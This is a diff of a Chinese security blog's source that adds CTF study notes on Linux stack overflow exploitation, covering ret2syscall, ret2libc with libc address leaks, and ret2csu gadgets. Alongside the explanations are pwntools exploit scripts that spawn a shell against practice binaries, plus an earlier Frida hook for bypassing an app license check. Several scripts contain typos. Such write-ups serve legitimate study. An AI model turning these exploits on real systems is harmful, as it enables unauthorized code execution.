@@ -5769,9 +5769,13 @@ In get/set mode no capture occurs.</code></pre><blockquote>
 <li>本地获取MAC地址及秘钥Key传入<code>MainActivity</code>得出答案。</li>
 </ol>
 <h3 id="对hook点进行分析"><a href="#对hook点进行分析" class="headerlink" title="对hook点进行分析"></a>对hook点进行分析</h3><ol>
-<li>获取getMac()函数的返回值，与“LICENSEKEYOK”字符串进行xor运算得出秘钥Key.</li>
-<li>hook getKey方法，让它不从<code>preferences</code>文件读取Key,而是我们自己构造。</li>
-<li>hook <code>verifyClick</code>,让它调用<code>showPremium</code>方法</li>
+<li><p>获取getMac()函数的返回值，与“LICENSEKEYOK”字符串进行xor运算得出秘钥Key.</p>
+</li>
+<li><p>hook getKey方法，让它不从<code>preferences</code>文件读取Key,而是我们自己构造。</p>
+</li>
+<li><p>hook <code>verifyClick</code>,让它调用<code>showPremium</code>方法</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229114906268.png" alt="image-20201229114906268"></p>
+</li>
 </ol>
 <h3 id="代码的构造与编写"><a href="#代码的构造与编写" class="headerlink" title="代码的构造与编写"></a>代码的构造与编写</h3><h3 id="hook-getMac-函数"><a href="#hook-getMac-函数" class="headerlink" title="hook getMac()函数"></a>hook getMac()函数</h3><p>getMac() 在showPremium函数中调用，showPremium在LauncherActivity类中，所有直接通过this就能直接调用getMac()方法</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">js_code = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var hook_Activity = Java.use(&#x27;</span>de.fraunhofer.sit.premiumapp.LauncherActivity<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">        hook_Activity.showPremium.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">            var Key = this.getKey();</span></span><br><span class="line"><span class="string">            var Mac = this.getMac();</span></span><br><span class="line"><span class="string">            send(Key);</span></span><br><span class="line"><span class="string">            send(Mac);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
@@ -6607,7 +6611,7 @@ In get/set mode no capture occurs.</code></pre><blockquote>
   <entry>
     <title>linux-stack-Overflow-1</title>
     <url>/2020/12/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/linux-stack-Overflow-1/</url>
-    <content><![CDATA[<h2 id="栈介绍"><a href="#栈介绍" class="headerlink" title="栈介绍"></a>栈介绍</h2><h3 id="基本栈介绍"><a href="#基本栈介绍" class="headerlink" title="基本栈介绍"></a>基本栈介绍</h3><blockquote>
+    <content><![CDATA[<h1 id="栈介绍"><a href="#栈介绍" class="headerlink" title="栈介绍"></a>栈介绍</h1><h3 id="基本栈介绍"><a href="#基本栈介绍" class="headerlink" title="基本栈介绍"></a>基本栈介绍</h3><blockquote>
 <p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p>
 </blockquote>
 <p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/Data_stack.png" alt="基本栈操作"></p>
@@ -6825,7 +6829,10 @@ In get/set mode no capture occurs.</code></pre><blockquote>
 <p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2syscall&#39;)</span><br><span class="line"></span><br><span class="line">pop_eax_ret &#x3D; 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret &#x3D; 0x0806eb90</span><br><span class="line">int_0x80 &#x3D; 0x08049421</span><br><span class="line">bin_sh &#x3D; 0x080be408</span><br><span class="line"></span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>这里我们以 bamboofox 中 ret2libc1 为例</p>
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><blockquote>
+<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
+</blockquote>
+<h3 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h3><p>这里我们以 bamboofox 中 ret2libc1 为例</p>
 <p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p>
 <p>首先，我们可以检查一下程序的安全保护</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ checksec ret2libc1</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2libc1&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
@@ -6842,12 +6849,134 @@ In get/set mode no capture occurs.</code></pre><blockquote>
 <p>那么我们直接返回该处，执行system函数。payload如下</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc1&#39;)</span><br><span class="line"></span><br><span class="line">bin_bash &#x3D; 0x08048720</span><br><span class="line">system_addr &#x3D; 0x08048460</span><br><span class="line"></span><br><span class="line">payload &#x3D; flat([&#39;A&#39; *112, system_addr, &#39;bbbb&#39; , bin_bash])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>更新中…</p>
-<h2 id="参考阅读"><a href="#参考阅读" class="headerlink" title="参考阅读"></a>参考阅读</h2><p><a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">stack buffer overflow</a></p>
+<p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p>
+<p>这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。</p>
+<h3 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h3><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p>
+<p>该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.plt:08048490 _system</span><br><span class="line">.plt:08048460 _gets           </span><br><span class="line">.bss:0804A080 buf2 </span><br><span class="line">0x0804843d : pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
+<p>payload1 堆栈平衡(在调用完gets之后要把调用的参数给pop出来，提升栈堆(保持esp和ebp的值不变)再对system进行调用)如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc2&#39;)</span><br><span class="line">system_addr &#x3D; 0x08048490</span><br><span class="line">gets_addr &#x3D; 0x08048460</span><br><span class="line">buf2_addr &#x3D; 0x0804A080</span><br><span class="line">pop_ebx_addr &#x3D; 0x0804843d</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112 ,gets_addr, pop_ebx_addr, buf2_addr, system_addr , &#39;aaaa&#39; , buf])</span><br><span class="line">sh.sendline(paylaod)</span><br><span class="line">sh.sendline(&#39;&#x2F;bin&#x2F;bash&#39;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>payload2 :</p>
+<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201227101548054.png" alt="image-20201227101548054" style="zoom:50%;">
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc2&#39;)</span><br><span class="line">system_addr &#x3D; 0x08048490</span><br><span class="line">gets_addr &#x3D; 0x08048460</span><br><span class="line">buf2_addr &#x3D; 0x0804A080</span><br><span class="line">pop_ebx_addr &#x3D; 0x0804843d</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112 ,gets_addr, system_addr, buf2_addr, buf2_addr])</span><br><span class="line">sh.sendline(paylaod)</span><br><span class="line">sh.sendline(&#39;&#x2F;bin&#x2F;bash&#39;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="例子3"><a href="#例子3" class="headerlink" title="例子3"></a>例子3</h3><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p>
+<p>在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2libc3&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p>
+<ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li>
+<li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li>
+</ul>
+<p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p>
+<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>
+<p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p>
+<ul>
+<li><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></li>
+</ul>
+<p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p>
+<p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p>
+<ul>
+<li>泄露 __libc_start_main 地址</li>
+<li>获取 libc 版本</li>
+<li>获取 system 地址与 /bin/sh 的地址</li>
+<li>再次执行源程序</li>
+<li>触发栈溢出执行 system(‘/bin/sh’)</li>
+</ul>
+<p>手动寻找：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;libc.blukat.me&#x2F;</span><br><span class="line"></span><br><span class="line">$ .&#x2F;find __libc_start_main d90</span><br><span class="line">http:&#x2F;&#x2F;ftp.osuosl.org&#x2F;pub&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;g&#x2F;glibc&#x2F;libc6_2.27-3ubuntu1_i386.deb (id libc6_2.27-3ubuntu1_i386)</span><br><span class="line">http:&#x2F;&#x2F;ftp.osuosl.org&#x2F;pub&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;g&#x2F;glibc&#x2F;libc6-i386_2.27-3ubuntu1_amd64.deb (id libc6-i386_2.27-3ubuntu1_amd64)</span><br><span class="line"></span><br><span class="line">$ .&#x2F;dump libc6-i386_2.27-3ubuntu1_amd64</span><br><span class="line">offset___libc_start_main_ret &#x3D; 0x18e81</span><br><span class="line">offset_system &#x3D; 0x0003cd10</span><br><span class="line">offset_dup2 &#x3D; 0x000e6110</span><br><span class="line">offset_read &#x3D; 0x000e5620</span><br><span class="line">offset_write &#x3D; 0x000e56f0</span><br><span class="line">offset_str_bin_sh &#x3D; 0x17b8cf</span><br></pre></td></tr></table></figure>
+
+
+
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2libc3&#39;)</span><br><span class="line"></span><br><span class="line">ret2libc3 &#x3D; ELF(&#39;.&#x2F;ret2libc3&#39;)</span><br><span class="line"></span><br><span class="line">puts_plt &#x3D; ret2libc3.plt[&#39;puts&#39;]</span><br><span class="line">libc_start_main_got &#x3D; ret2libc3.got[&#39;__libc_start_main&#39;]</span><br><span class="line">main &#x3D; ret2libc3.symbols[&#39;main&#39;]</span><br><span class="line"></span><br><span class="line">print &quot;leak libc_start_main_got addr and return to main again&quot;</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 112, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(&#39;Can you find it !?&#39;, payload)</span><br><span class="line"></span><br><span class="line">print &quot;get the related addr&quot;</span><br><span class="line">libc_start_main_addr &#x3D; u32(sh.recv()[0:4])</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;__libc_start_main&#39;, libc_start_main_addr)</span><br><span class="line">libcbase &#x3D; libc_start_main_addr - libc.dump(&#39;__libc_start_main&#39;)</span><br><span class="line">system_addr &#x3D; libcbase + libc.dump(&#39;system&#39;)</span><br><span class="line">binsh_addr &#x3D; libcbase + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">print &quot;get shell&quot;</span><br><span class="line">payload &#x3D; flat([&#39;A&#39; * 104, system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul>
+<li><p>train.cs.nctu.edu.tw: ret2libc</p>
+</li>
+<li><p>train.cs.nctu.edu.tw: rop</p>
+</li>
+<li><p>2013-PlaidCTF-ropasaurusrex</p>
+</li>
+<li><p>Defcon 2015 Qualifier: R0Pbaby</p>
+</li>
+</ul>
+<h1 id="Intermediate-ROP"><a href="#Intermediate-ROP" class="headerlink" title="Intermediate ROP"></a>Intermediate ROP</h1><p>中级 ROP 主要是使用了一些比较巧妙的 Gadgets。</p>
+<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><blockquote>
+<p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004005C0 ; __unwind &#123;</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 ; &#125; &#x2F;&#x2F; starts at 4005C0</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以利用以下几点</p>
+<ul>
+<li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</li>
+<li>从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li>
+<li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。</li>
+</ul>
+<h4 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h4><p>这里我们以一步一步学 ROP 之 linux_x64 篇中 level5 为例进行介绍。首先检查程序的安全保护</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ checksec level5   </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;oldthree&#x2F;Desktop&#x2F;level5&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>程序为 64 位，开启了堆栈不可执行保护。</p>
+<p>其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; &#x2F;&#x2F; [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x200uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>基本利用思路如下</p>
+<ul>
+<li>利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数</li>
+<li>根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址</li>
+<li>再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 ‘/bin/sh’ 地址，并使得程序重新执行 main 函数。</li>
+<li>再次利用栈溢出执行 libc_csu_gadgets 执行 execve(‘/bin/sh’) 获取 shell。</li>
+</ul>
+<p>exp 如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">debug &#x3D; True</span><br><span class="line"></span><br><span class="line">context(log_level &#x3D; &#39;debug&#39;, arch &#x3D; &#39;amd64&#39;, os &#x3D; &#39;linux&#39;)</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">    sh &#x3D; process(&quot;.&#x2F;level5&quot;)</span><br><span class="line">    level5&#x3D;ELF(&#39;.&#x2F;level5&#39;)</span><br><span class="line">else:</span><br><span class="line">    link &#x3D; &quot;x.x.x.x:xx&quot;</span><br><span class="line">    ip, port &#x3D; map(lambda x:x.strip(), link.split(&#39;:&#39;))</span><br><span class="line">    sh &#x3D; remote(ip, port)</span><br><span class="line">    elf&#x3D;ELF(&#39;.&#x2F;level5&#39;)</span><br><span class="line"></span><br><span class="line">write_got &#x3D; level5.got[&#39;write&#39;]</span><br><span class="line">read_got &#x3D; level5.got[&#39;read&#39;]</span><br><span class="line">main_addr &#x3D; level5.symbols[&#39;main&#39;]</span><br><span class="line">bss_base &#x3D; level5.bss()</span><br><span class="line">csu_front_addr &#x3D; 0x0000000000400600</span><br><span class="line">csu_end_addr &#x3D; 0x000000000040061A</span><br><span class="line">fakeebp &#x3D; &#39;b&#39; * 8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def csu(rbx, rbp, r12, r13, r14, r15, last):</span><br><span class="line">    # pop rbx,rbp,r12,r13,r14,r15</span><br><span class="line">    # rbx should be 0,</span><br><span class="line">    # rbp should be 1,enable not to jump</span><br><span class="line">    # r12 should be the function we want to call</span><br><span class="line">    # rdi&#x3D;edi&#x3D;r15d</span><br><span class="line">    # rsi&#x3D;r14</span><br><span class="line">    # rdx&#x3D;r13</span><br><span class="line">    payload &#x3D; &#39;a&#39; * 0x80 + fakeebp</span><br><span class="line">    payload +&#x3D; p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload +&#x3D; p64(csu_front_addr)</span><br><span class="line">    payload +&#x3D; &#39;a&#39; * 0x38</span><br><span class="line">    payload +&#x3D; p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Hello, World\n&#39;)</span><br><span class="line">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span><br><span class="line">## write(1,write_got,8)</span><br><span class="line">csu(0, 1, write_got, 8, write_got, 1, main_addr)</span><br><span class="line">#write(1, writ_got_addr, 8)</span><br><span class="line"></span><br><span class="line">write_addr &#x3D; u64(sh.recv(8))</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;, write_addr)</span><br><span class="line">libc_base &#x3D; write_addr - libc.dump(&#39;write&#39;)</span><br><span class="line">execve_addr &#x3D; libc_base + libc.dump(&#39;execve&#39;)</span><br><span class="line">log.success(&#39;execve_addr &#39; + hex(execve_addr))</span><br><span class="line">##gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">## read(0,bss_base,16)</span><br><span class="line">## read execve_addr and &#x2F;bin&#x2F;sh\x00</span><br><span class="line">sh.recvuntil(&#39;Hello, World\n&#39;)</span><br><span class="line">csu(0, 1, read_got, 16, bss_base, 0, main_addr)</span><br><span class="line">#read(0,bss_base,16)</span><br><span class="line">sh.send(p64(execve_addr) + &#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Hello, World\n&#39;)</span><br><span class="line">## execve(bss_base+8)</span><br><span class="line">csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)</span><br><span class="line">#execve(&#x2F;bin&#x2F;sh,0,0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>gadget构造的payload要在末尾加上0x38个填充字符</p>
+<p>gadget1:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br></pre></td></tr></table></figure>
+
+<p>gadget2:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>
+
+<p>rsp  8 *  (8 -1)  </p>
+<p>ps: add rsp,8  + pop * 6 + ret -call</p>
+<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><h5 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h5><p>在上面的时候，我们直接利用了这个通用 gadgets，其输入的字节长度为 128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法</p>
+<h5 id="改进-1-提前控制-RBX-与-RBP"><a href="#改进-1-提前控制-RBX-与-RBP" class="headerlink" title="改进 1 - 提前控制 RBX 与 RBP"></a>改进 1 - 提前控制 RBX 与 RBP<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#1-rbx-rbp"></a></h5><p>可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。</p>
+<h5 id="改进-2-多次利用"><a href="#改进-2-多次利用" class="headerlink" title="改进 2 - 多次利用 "></a>改进 2 - 多次利用 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#2-"></a></h5><p>其实，改进 1 也算是一种多次利用。我们可以看到我们的 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。但这里的多次利用需要更加严格的条件</p>
+<ul>
+<li>漏洞可以被多次触发</li>
+<li>在两次触发之间，程序尚未修改 r12-r15 寄存器，这是因为要两次调用。</li>
+</ul>
+<p><strong>当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。</strong></p>
+<h5 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#gadget"></a></h5><p>其实，除了上述这个 gadgets，gcc 默认还会编译进去一些其它的函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_init</span><br><span class="line">_start</span><br><span class="line">call_gmon_start</span><br><span class="line">deregister_tm_clones</span><br><span class="line">register_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">frame_dummy</span><br><span class="line">__libc_csu_init</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_fini</span><br></pre></td></tr></table></figure>
+
+<p>我们也可以尝试利用其中的一些代码来进行执行。此外，由于 PC 本身只是将程序的执行地址处的数据传递给 CPU，而 CPU 则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。</p>
+<p>需要一说的是，在上面的 libc_csu_init 中我们主要利用了以下寄存器</p>
+<ul>
+<li>利用尾部代码控制了 rbx，rbp，r12，r13，r14，r15。</li>
+<li>利用中间部分的代码控制了 rdx，rsi，edi。</li>
+</ul>
+<p>而其实 libc_csu_init 的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A 是正常的起始地址，<strong>可以看到我们在 0x000000000040061f 处可以控制 rbp 寄存器，在 0x0000000000400621 处可以控制 rsi 寄存器。</strong>而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。</p>
